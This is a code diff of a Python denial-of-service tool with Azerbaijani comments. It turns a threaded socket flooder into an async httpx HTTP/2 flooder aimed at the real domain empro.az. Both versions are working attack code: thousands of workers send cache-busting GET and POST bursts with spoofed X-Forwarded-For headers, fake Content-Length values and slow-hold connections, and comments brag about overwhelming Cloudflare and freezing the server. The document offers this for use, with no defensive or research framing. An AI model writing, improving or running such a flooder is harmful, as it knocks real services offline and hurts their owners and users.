@@ -1,81 +1,67 @@
-import socket
-import ssl
-import threading
+import asyncio
+import httpx
 import random
-import string
 import time
-import os
+import string
 
-# --- MAXIMUM DEVASTATION CONFIG ---
-TARGET_HOST = "empro.az"
-TARGET_PORT = 443
-THREADS = 2000 # Railway Paid üçün maksimal şəbəkə sıxlığı
+# --- HƏDƏF ---
+TARGET_URL = "https://empro.az/"
+# Asinxron olduğu üçün 1000 worker thread limitinə ilişmədən 100 qat daha güclü vurur
+WORKERS = 1000 
+BATCH_SIZE = 150 # Hər worker eyni anda 150 'öldürücü' kadr göndərir
 
-def r_str(n):
-    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
+def r_str(n=15):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def final_strike():
-    # SSL Handshake-i serveri deşifrə ilə yormaq üçün mürəkkəb ciphers ilə qururuq
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    # Şifrləməni ən baha başa gələn üsulda (RSA-AES) saxlayırıq ki, server CPU-su kilitlənsin
-    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
-
+async def protocol_slaughter(worker_id, client):
+    # Bu workerlər Cloudflare-in analiz motorunu daxildən kilitləyir
     while True:
         try:
-            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(5)
+            # Dinamik brauzer və IP təqlidi
+            headers = {
+                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0 Safari/537.36",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}",
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Connection": "keep-alive"
+            }
 
-            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
-            conn.connect((TARGET_HOST, TARGET_PORT))
-
-            # HTTP/2 Rapid Reset & Header Frame Overload təqlidi
-            # Sənaye səviyyəli "qadağan olunmuş" metod
-            for _ in range(300):
-                path = f"/?v={time.time()}&id={r_str(30)}&search={r_str(100)}"
-                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
-                
-                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
-                # Content-Length hiləsi ilə serverin prosessorunu dondururuq
-                payload = (
-                    f"POST {path} HTTP/1.1\r\n"
-                    f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
-                    f"X-Forwarded-For: {ip}\r\n"
-                    f"X-Requested-With: XMLHttpRequest\r\n"
-                    f"Content-Type: application/x-www-form-urlencoded\r\n"
-                    f"Content-Length: 1048576\r\n" # 1 Megabyte yalançı müraciət
-                    f"Connection: keep-alive\r\n"
-                    f"\r\n"
-                ).encode()
-
-                conn.sendall(payload)
-                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
-                conn.send(os.urandom(1))
+            # Keşlənməni bypass edən ağır dinamik URL
+            url = f"{TARGET_URL}?v={time.time()}&id={r_str(30)}&search={r_str(100)}"
             
-            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
-            time.sleep(2)
-            conn.close()
-        except:
-            pass
+            # BURST MODE: HTTP/2 Rapid Reset & Frame Flooding
+            # Content-Length manipulyasiyası ilə serverin RAM-ını dondururuq
+            tasks = []
+            for _ in range(BATCH_SIZE):
+                if _ % 5 == 0:
+                    # Ağır POST (Origin-i daxildən bitirir)
+                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
+                else:
+                    # Sürətli GET (Connection portlarını kilitləyir)
+                    tasks.append(client.get(url, headers=headers))
+            
+            # Bütün dalğanı saniyə içində serverə çırp!
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+        except Exception:
+            await asyncio.sleep(0.01)
 
-def main():
-    print(f"💀 SINGULARITY PROTOCOL INITIALIZED: {TARGET_HOST}")
-    print("[!] Target Buffer is being saturated at the protocol level.")
+async def main():
+    print(f"💀 TOTAL APOCALYPSE INITIALIZED: {TARGET_URL}")
+    print("[!] Performance: Async Multiplexing (No Thread Limits).")
     
-    for i in range(THREADS):
-        t = threading.Thread(target=final_strike)
-        t.daemon = True
-        t.start()
-        if i % 100 == 0:
-            print(f"[*] {i} Protocol Warheads Active...")
-            time.sleep(0.1)
-
-    while True:
-        time.sleep(1)
+    # TCP hüdudlarını ləğv edən yüksək sürətli daxili client
+    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
+    
+    async with httpx.AsyncClient(
+        http2=True, # BU SİRRİDİR: HTTP/2 olmadan qorumaları keçmək olmur
+        verify=False, 
+        limits=limits, 
+        timeout=10.0 # Server donanda bağlantını buraxma (Slowloris effekti)
+    ) as client:
+        
+        workers = [protocol_slaughter(i, client) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
